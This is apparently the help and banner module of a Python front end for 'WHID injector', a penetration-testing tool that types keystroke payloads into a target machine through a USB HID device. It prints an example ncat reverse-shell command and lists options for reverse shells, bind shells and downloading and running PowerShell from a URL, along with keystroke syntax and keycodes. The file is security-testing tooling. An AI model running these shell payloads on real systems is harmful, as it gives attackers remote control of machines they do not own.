import glob

# NOTE: this class is working as a documentation for the project
class WhidInfo(object):
    def __init__(self):
        print("""
        \033[93m -------------------------------------------------------------\033[0m
        \033[1m  WHID injector - You need to be connected to the Exploit AP\033[0m
        \033[93m -------------------------------------------------------------
                       __   °
                     <(o )___
                      ( ._> /
                       `---'\033[0m                      @pentest_swissky
        """)
        print("Enter a payload, eg: bash -c 'nohup ncat 127.0.0.1 4242 -e $SHELL &'")
        print("-------------------------------------------------------------------")


    def help(self):
        print("\033[1m--------------[ Events ]--------------\033[0m")
        print("q/exit     => exit the program")
        print("h/help     => display this help message")
        print("reverse    => use a basic reverse-shell based on ncat")
        print("bind       => set up a bind-shell")
        print("empire URL => download and execute a powershell string")
        print("send MSG   => write MSG")
        print("")

        files = glob.glob("payloads/*")
        print("\033[1m--------------[ Payloads ]--------------\033[0m")
        print("Use these as the following option --payload payload_name")
        for filename in files:
            print(filename)
        print("")

    def help_commands(self):
        print("\033[1m--------------[ Commands ]--------------\033[0m")
        print("Comment     => Rem: Comment")
        print("Delay       => CustomDelay:1000")
        print("Send key    => Press:X+Y, Press:131+114")
        print("Send text   => Print:XYZ")
        print("Move mouse  => MouseMove[Up,Down,Left,Right]:X")
        print("Mouse click => MouseClick[LEFT,RIGHT,MIDDLE]:X")
        print("Blink led   => BlinkLED:X")
        print("")

    def help_keyboard(self):
        print("\033[1m--------------[ KeyboardModifiers ]--------------\033[0m")
        print("Key           Decimal| Key           Decimal")
        print("KEY_LEFT_CTRL    128 | KEY_LEFT_SHIFT    129")
        print("KEY_LEFT_ALT     130 | KEY_LEFT_GUI      131")
        print("KEY_RIGHT_CTRL   132 | KEY_RIGHT_SHIFT   133")
        print("KEY_RIGHT_ALT    134 | KEY_RIGHT_GUI     135")
        print("KEY_UP_ARROW     218 | KEY_DOWN_ARROW    217")
        print("KEY_LEFT_ARROW   216 | KEY_RIGHT_ARROW   215")
        print("KEY_BACKSPACE    178 | KEY_TAB           179")
        print("KEY_RETURN       176 | KEY_ESC           177")
        print("KEY_INSERT       209 | KEY_PAGE_UP       211")
        print("KEY_DELETE       212 | KEY_HOME          210")
        print("KEY_END          213 | KEY_CAPS_LOCK     193")
        print("KEY_F1           194 | KEY_F2            195")
        print("KEY_F3           196 | KEY_F4            197")
        print("KEY_F5           198 | KEY_F6            199")
        print("KEY_F7           200 | KEY_F8            201")
        print("KEY_F9           202 | KEY_F10           203")
        print("KEY_F11          204 | KEY_F12           205")
        print("")
